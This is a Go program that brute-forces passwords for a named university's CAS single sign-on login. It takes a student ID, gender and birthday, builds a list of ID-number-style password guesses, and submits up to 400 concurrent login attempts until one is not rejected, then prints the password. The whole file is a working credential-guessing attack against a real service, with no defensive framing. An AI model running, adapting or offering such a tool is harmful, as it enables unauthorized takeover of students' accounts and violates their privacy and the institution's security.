package main

import (
	"net/http"
	"net/url"
	"fmt"
	"strings"
	"github.com/PuerkitoBio/goquery"
	"sync"
	"time"
)

const baseURL = "https://cas.shmtu.edu.cn/cas/login?service=https%3A%2F%2Fportal.shmtu.edu.cn%2Fnode"
// 并发
var limit = 400
// 性别
var isBoy = 1
// 学号
var stu_number string
// 默认1号出生
var birthday = "01"
// 结束信号
var done string

func main(){
	// 获取用户输入
	fmt.Printf("请输入学号:")
	fmt.Scanln(&stu_number)
	fmt.Printf("请输入性别(男为1,女为0):")
	fmt.Scanln(&isBoy)
	fmt.Printf("请输入生日(01-31,没有就回车):")
	fmt.Scanln(&birthday)
	// 生成密码列表
	var list []string
	ch := make(chan bool, limit)
	var wg sync.WaitGroup
 for i:=0 ; i<320000 ; i++ {
 	if i < 10 {
 		list = append(list,fmt.Sprintf("%s000%d", birthday, i))
		}
		if i > 10 && i / 10 % 2 == isBoy {
			if i < 100 && i >= 10 {
				list = append(list,fmt.Sprintf("%s00%d", birthday, i))
			}
			if i < 1000 && i >= 100 {
				list = append(list,fmt.Sprintf("%s0%d", birthday, i))
			}
			if i < 10000 && i >= 1000 {
				list = append(list,fmt.Sprintf("%s%d", birthday, i))
			}
			// 如果没有提供出生日期
			if birthday == "01" {
				if i < 100000 && i >= 10000 {
					list = append(list,fmt.Sprintf("0%d",i))
				}
				if i >= 100000 {
					list = append(list,fmt.Sprintf("%d",i))
				}
			}
		}
	}
	startTime := time.Now()
	section := len(list) / limit
	lt, execution := getParam()
 Loop:
  for i := 0; i < section; i++ {
	  // 等待limit个协程执行完毕
	  wg.Add(limit)
	  for j := 1; j <= limit; j++ {
		  go func(j int,ch chan<- bool) {
			  defer wg.Done()
			  if i*limit + j > len(list) {
			    return
			  }
			  result := getResult(list[i*limit+j], lt, execution)
			  if result != "" {
				  fmt.Printf("密码找到啦!!!!!!!%s\n",result)
				  ch <- true
			  } else {
				  ch <- false
			  }
		  }(j,ch)
	  }
	  wg.Wait()
	  // 寻找成功信号
	  for n := 0; n < limit; n++ {
		  if <-ch {
			   break Loop
		  }
	  }
  }
	endTime := time.Now()
	fmt.Println(endTime.Sub(startTime))
	fmt.Println("如果找到了多个密码- -,那就是网络问题,重试就完事了,我的代码不会有错的哼")
	fmt.Println("如果你乱输参数找不到,我也不背锅")
	fmt.Println("按任意键结束程序:")
	fmt.Scanln(&done)
}
func getResult(pass string, lt string, execution string) string {
	postValue := url.Values{
		"signin": {"登录"},
		"username": {stu_number},
		"password": {pass},
		"lt": {lt},
		"execution": {execution},
		"_eventId": {"submit"},
	}
	postString := postValue.Encode()
	client := &http.Client{}
	//提交请求
	reqest, _ := http.NewRequest("POST", baseURL, strings.NewReader(postString))
	//增加header选项
	reqest.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(reqest)
	if err != nil {
		fmt.Println("请求出错")
		return ""
	}
	defer resp.Body.Close()
	doc, err1 := goquery.NewDocumentFromReader(resp.Body)
	if err1 != nil {
		fmt.Println("解析出错")
		return ""
	}
	res := doc.Find("#msg").Text()
	if res != "认证信息无效。" {
		return pass
	} else {
		fmt.Printf("%s错误\n",pass)
		return ""
	}
}
func getParam() (execution string, lt string){
	res, e1 := http.Get(baseURL)
	if e1 != nil {
		fmt.Println("获取参数错误")
	}
	defer res.Body.Close()
	doc, _ := goquery.NewDocumentFromReader(res.Body)
	ltDom := doc.Find("input[name='lt']")
	executionDom := doc.Find("input[name='execution']")
	lt, _= ltDom.Attr("value")
	execution, _ = executionDom.Attr("value")
	return lt, execution
}